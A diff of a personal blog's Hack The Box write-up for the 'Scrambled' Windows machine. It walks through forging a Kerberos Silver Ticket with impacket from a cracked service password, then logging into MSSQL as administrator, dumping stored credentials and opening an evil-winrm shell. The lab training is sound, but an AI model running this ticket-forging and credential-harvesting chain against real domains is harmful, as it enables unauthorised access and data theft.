@@ -25,6 +25,7 @@ PORT      STATE SERVICE
 1433/tcp  open  ms-sql-s
 3268/tcp  open  globalcatLDAP
 3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
 9389/tcp  open  adws
 49668/tcp open  unknown
 49673/tcp open  unknown
@@ -311,11 +312,310 @@ Hardware.Mon.#1..: Util: 90%
 
 Started: Tue Sep 12 20:03:56 2023
 Stopped: Tue Sep 12 20:04:08 2023
-</code></pre><ul><li>We have <code>sqlsvc:Pegasus60</code></li><li></li></ul><h2 id=user>User</h2><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li>We have <code>sqlsvc:Pegasus60</code><ul><li>But the creds doesn&rsquo;t give anything</li><li>We can perform <code>Silver Ticket</code> attack<ul><li><code>The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash). Thus, it is possible to gain access to that service by forging a custom TGS as any user.</code></li><li><a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket target=_blank rel=noopener>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a></li></ul></li><li>We need:<ul><li><code>NTLM</code> hash</li><li>The <code>SID</code> of the domain</li><li><code>SPN</code> of the account</li></ul></li><li>Let&rsquo;s convert password to <code>NTLM</code><ul><li><a href=https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html target=_blank rel=noopener>https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html</a></li></ul></li></ul></li></ul><pre tabindex=0><code>└─$ iconv -f ASCII -t UTF-16LE &lt;(printf &#34;Pegasus60&#34;) | openssl dgst -md4
+MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05
+</code></pre><p><img src=./images/8.png alt></p><ul><li>Let&rsquo;s get <code>SID</code> of the domain</li></ul><pre tabindex=0><code>└─$ ldapsearch -H ldap://dc1.scrm.local -D ksimpson@scrm.local -w ksimpson -b &#34;DC=scrm,DC=local&#34;                          
+ldap_bind: Strong(er) authentication required (8)
+        additional info: 00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v4563
+</code></pre><ul><li>I need to download the certificate</li></ul><pre tabindex=0><code>└─$ openssl s_client -connect dc1.scrm.local:636 &lt; /dev/null | sed -ne &#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&#39; 
+depth=0 CN = DC1.scrm.local
+verify error:num=20:unable to get local issuer certificate
+verify return:1
+depth=0 CN = DC1.scrm.local
+verify error:num=21:unable to verify the first certificate
+verify return:1
+depth=0 CN = DC1.scrm.local
+verify return:1
+-----BEGIN CERTIFICATE-----
+MIIGHDCCBQSgAwIBAgITEgAAAAOnziQ14yF6dQAAAAAAAzANBgkqhkiG9w0BAQUF
+ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
+MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMzA5MTIyMjU4MjVaFw0yNDA5MTEy
+MjU4MjVaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
+AQEFAAOCAQ8AMIIBCgKCAQEAwVjLBnJ5jxlXIaflyk+A/cjJL+459zVrtlS1O+6g
+XuHi4dK/FgI57emiUM6w5HWcN0+BqFdkqiyBLKN8ciWuNVZ9yIT2SScoldyj2PHc
+y8C8it7zHuiflgTtVwgxNzGsLNm326viZPxOcHYZMlxgZLj+1HgUCgRhz7XlLjJX
+K3n7dsClvER5v+XzM7j2rx0LbdMgZ4SHWVQVkrWp4DK04hWRdo/T+lxS40lKfJ8X
+U4MA0Nn9dEyE09Hwbue8ikiRYNhV7Ea4Fb5pDuOe3zVTobIazAhnOqAHaa7COXPx
+Y3qckhHDuhh0uVTO73PKV2uhePOOenHvdW3eBUtyi279zQIDAQABo4IDMTCCAy0w
+LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
+eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
+AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUTCZWTY3oLpQFrXlk
+rF5NdzbBjpYwHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
+HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
+LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
+Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
+Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
+MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
+cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
+ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
+aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
+OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
+LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
+MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
+KoZIhvcNAQEFBQADggEBAHejAv0dYre1sg5vNiwwWwlI8U4a/9MWkTSdMCUe+JEu
+dPAdZKIEzsPkFIHIAl5+S5Yb/aPNtekGvEyLJ5k2f14YJg5b2iscS6pgVTYsAEGp
+z6pjy1DNUIeDuk7RDoKFG+yYwxc24K1RchkbKLZhQdDkZ7KJlkN9cnV0ioVWLLmy
+R6WUrzxggnkC4B4dPWqR2QVki88DorQt961ccAZF/KegcjUK2iZ8+y8jiukT51oV
+UaZIXMP0j8qs/sW0Vn4WCL0Iv1pzj4D2l4qTHoPR5tcC5qMQVNrYTquq567o+JZS
+2XWj/FmV8lo3bu4B3zfoPQBJYUqQVrKzfuAqYyyp9os=
+-----END CERTIFICATE-----
+DONE            
+</code></pre><pre tabindex=0><code>└─$ openssl s_client -connect dc1.scrm.local:636 &lt; /dev/null | sed -ne &#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&#39; &gt; scrm.local.crt
+depth=0 CN = DC1.scrm.local
+verify error:num=20:unable to get local issuer certificate
+verify return:1
+depth=0 CN = DC1.scrm.local
+verify error:num=21:unable to verify the first certificate
+verify return:1
+depth=0 CN = DC1.scrm.local
+verify return:1
+DONE
+</code></pre><ul><li>Edit <code>/etc/ldap/ldap.conf</code></li></ul><pre tabindex=0><code>#
+# LDAP Defaults
+#
+
+# See ldap.conf(5) for details
+# This file should be world readable but not world writable.
+
+#BASE   dc=example,dc=com
+#URI    ldap://ldap.example.com ldap://ldap-provider.example.com:666
+
+#SIZELIMIT      12
+#TIMELIMIT      15
+#DEREF          never
+
+# TLS certificates (needed for GnuTLS)
+#TLS_CACERT     /etc/ssl/certs/ca-certificates.crt
+TLS_CACERT      /home/kali/Documents/tasks/scrm.local.crt
+</code></pre><ul><li>Let&rsquo;s run <code>ldapsearch</code> again</li></ul><pre tabindex=0><code>└─$ ldapsearch -H ldap://dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b &#34;DC=scrm,DC=local&#34; &#34;(objectClass=user)&#34; 
+# extended LDIF
+#
+# LDAPv3
+# base &lt;DC=scrm,DC=local&gt; with scope subtree
+# filter: (objectClass=user)
+# requesting: ALL
+#
+
+# Administrator, Users, scrm.local
+dn: CN=Administrator,CN=Users,DC=scrm,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Administrator
+description: Built-in account for administering the computer/domain
+distinguishedName: CN=Administrator,CN=Users,DC=scrm,DC=local
+...
+objectSid:: AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==
+...
+</code></pre><ul><li><code>SID</code> is in string form<ul><li>We need to convert it</li><li><a href="https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253" target=_blank rel=noopener>https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253</a></li><li><a href=https://stackoverflow.com/a/65364978 target=_blank rel=noopener>https://stackoverflow.com/a/65364978</a><ul><li><code>S-1-5-21-2743207045-1827831105-2542523200-500</code></li></ul></li></ul></li></ul><pre tabindex=0><code>import base64
+from samba.dcerpc import security
+from samba.ndr import ndr_unpack
+
+
+base64_sid = &#34;AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==&#34;
+binary_sid = base64.b64decode(base64_sid)
+
+print(str(ndr_unpack(security.dom_sid, binary_sid)))
+</code></pre><pre tabindex=0><code>└─$ python3 sid_binary_to_string.py 
+S-1-5-21-2743207045-1827831105-2542523200-500
+</code></pre><ul><li>We can also use <code>impacket-getPac</code> to get the <code>SID</code></li></ul><pre tabindex=0><code>└─$ impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson                      
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+KERB_VALIDATION_INFO 
+LogonTime:                      
+    dwLowDateTime:                   222038284 
+    dwHighDateTime:                  31057291 
+LogoffTime:                     
+    dwLowDateTime:                   4294967295 
+    dwHighDateTime:                  2147483647 
+KickOffTime:                    
+    dwLowDateTime:                   4294967295 
+    dwHighDateTime:                  2147483647 
+PasswordLastSet:                
+    dwLowDateTime:                   2585823167 
+    dwHighDateTime:                  30921784 
+PasswordCanChange:              
+    dwLowDateTime:                   3297396671 
+    dwHighDateTime:                  30921985 
+PasswordMustChange:             
+    dwLowDateTime:                   4294967295 
+    dwHighDateTime:                  2147483647 
+EffectiveName:                   &#39;administrator&#39; 
+...
+ResourceGroupCount:              1 
+ResourceGroupIds:               
+    [
+         
+        RelativeId:                      572 
+        Attributes:                      536870919 ,
+    ] 
+Domain SID: S-1-5-21-2743207045-1827831105-2542523200
+
+ 0000   10 00 00 00 4E F3 44 2B  F2 47 34 D9 3C 0F 53 68   ....N.D+.G4.&lt;.Sh
+</code></pre><ul><li>Now we have all we need<ul><li>Let&rsquo;s generate a ticket with <code>impacket-ticketer</code></li></ul></li></ul><pre tabindex=0><code>└─$ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for scrm.local/administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in administrator.ccache
+</code></pre><pre tabindex=0><code>└─$ klist
+klist: No credentials cache found (filename: /tmp/krb5cc_1000)
+</code></pre><pre tabindex=0><code>└─$ KRB5CCNAME=administrator.ccache klist
+Ticket cache: FILE:administrator.ccache
+Default principal: administrator@SCRM.LOCAL
+
+Valid starting       Expires              Service principal
+09/13/2023 17:37:26  09/10/2033 17:37:26  MSSQLSvc/dc1.scrm.local:1433@SCRM.LOCAL
+        renew until 09/10/2033 17:37:26
+</code></pre><ul><li>Let&rsquo;s connect to database using ticket</li></ul><pre tabindex=0><code>└─$ KRB5CCNAME=administrator.ccache impacket-mssqlclient -k dc1.scrm.local
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC1): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(DC1): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (SCRM\administrator  dbo@master)&gt;
+</code></pre><ul><li>Enumerate database<ul><li><a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server target=_blank rel=noopener>https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a></li></ul></li></ul><pre tabindex=0><code>SQL (SCRM\administrator  dbo@master)&gt; SELECT name FROM master.dbo.sysdatabases;
+name         
+----------   
+master       
+
+tempdb       
+
+model        
+
+msdb         
+
+ScrambleHR   
+
+SQL (SCRM\administrator  dbo@master)&gt; use ScrambleHR;
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
+[*] INFO(DC1): Line 1: Changed database context to &#39;ScrambleHR&#39;.
+SQL (SCRM\administrator  dbo@ScrambleHR)&gt; SELECT * FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
+TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
+-------------   ------------   ----------   ----------   
+ScrambleHR      dbo            Employees    b&#39;BASE TABLE&#39;   
+
+ScrambleHR      dbo            UserImport   b&#39;BASE TABLE&#39;   
+
+ScrambleHR      dbo            Timesheets   b&#39;BASE TABLE&#39;   
+
+SQL (SCRM\administrator  dbo@ScrambleHR)&gt; SELECT * from Employees;
+EmployeeID   FirstName   Surname   Title   Manager   Role   
+----------   ---------   -------   -----   -------   ----   
+SQL (SCRM\administrator  dbo@ScrambleHR)&gt; SELECT * from UserImport;
+LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
+--------   -----------------   ----------   ---------------   -------------   
+MiscSvc    ScrambledEggs9900   scrm.local                90               0   
+
+SQL (SCRM\administrator  dbo@ScrambleHR)&gt; SELECT * from Timesheets;
+EmployeeID   TimeStart   TimeEnd   
+----------   ---------   -------   
+</code></pre><ul><li>We have creds, let&rsquo;s try <code>winrm</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -h                                            
+                                        
+Evil-WinRM shell v3.5
+
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
+    -S, --ssl                        Enable ssl
+    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -&gt; CONTOSO.COM = { kdc = fooserver.contoso.com }
+    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
+    -e, --executables EXES_PATH      C# executables local path
+    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
+    -U, --url URL                    Remote url endpoint (default /wsman)
+    -u, --user USER                  Username (required if not using kerberos)
+    -p, --password PASS              Password
+    -H, --hash HASH                  NTHash
+    -P, --port PORT                  Remote host port (default 5985)
+    -V, --version                    Show version
+    -n, --no-colors                  Disable colors
+    -N, --no-rpath-completion        Disable remote path completion
+    -l, --log                        Log the WinRM session
+    -h, --help                       Display this help message
+</code></pre><ul><li>We need to change add <code>SCRM.LOCAL</code> realm in <code>/etc/krb5.conf</code></li></ul><pre tabindex=0><code>└─$ cat /etc/krb5.conf                                                   
+[libdefaults]
+        default_realm = SCRM.LOCAL 
+
+# The following krb5.conf variables are only for MIT Kerberos.
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        rdns = false
+
+
+# The following libdefaults parameters are only for Heimdal Kerberos.
+        fcc-mit-ticketflags = true
+
+[realms]
+        SCRM.LOCAL = {
+                kdc = dc1.scrm.local
+                master_kdc = dc1.scrm.local
+                admin_server = dc1.scrm.local
+                default_domain = dc1.scrm.local
+        }
+
+[domain_realm]
+        .scrm.local = SCRM.LOCAL
+        scrm.local = SCRM.LOCAL
+</code></pre><ul><li>Now, let&rsquo;s get get ticket<ul><li><code>MiscSvc:ScrambledEggs9900</code></li></ul></li></ul><pre tabindex=0><code>└─$ impacket-getTGT scrm.local/MiscSvc:ScrambledEggs9900 -dc-ip dc1.scrm.local                                                                                                              
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Saving ticket in MiscSvc.ccache
+</code></pre><p><img src=./images/9.png alt></p><h2 id=root>Root</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\miscsvc\Documents&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+SCRM\ITShare                                Group            S-1-5-21-2743207045-1827831105-2542523200-1609 Mandatory group, Enabled by default, Enabled group
+SCRM\ITUsers                                Group            S-1-5-21-2743207045-1827831105-2542523200-1610 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+</code></pre><ul><li>Now we can access <code>IT</code> share<ul><li>Inside we have <code>Sales Order Client</code> application</li><li>Let&rsquo;s download it</li></ul></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client&gt; ls
+
+
+    Directory: C:\Shares\IT\Apps\Sales Order Client
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/5/2021   8:52 PM          86528 ScrambleClient.exe
+-a----        11/5/2021   8:52 PM          19456 ScrambleLib.dll
+</code></pre><ul><li>Let&rsquo;s feed it to <code>dnspy</code></li></ul><pre tabindex=0><code>└─$ file  ScrambleClient.exe 
+ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+</code></pre><p><img src=./images/10.png alt></p><ul><li></li></ul></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fscrambled%2f&text=%5bHTB%5d%20Machine%3a%20Scrambled&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fscrambled%2f&title=%5bHTB%5d%20Machine%3a%20Scrambled" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fscrambled%2f&title=%5bHTB%5d%20Machine%3a%20Scrambled" target=_blank><i class="fab fa-linkedin"></i></a>
 <a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Scrambled&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fscrambled%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/windows/scrambled/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
-Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Sauna</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: SecNotes</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#user>User</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
+Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Sauna</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: SecNotes</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
 Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
 <img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>
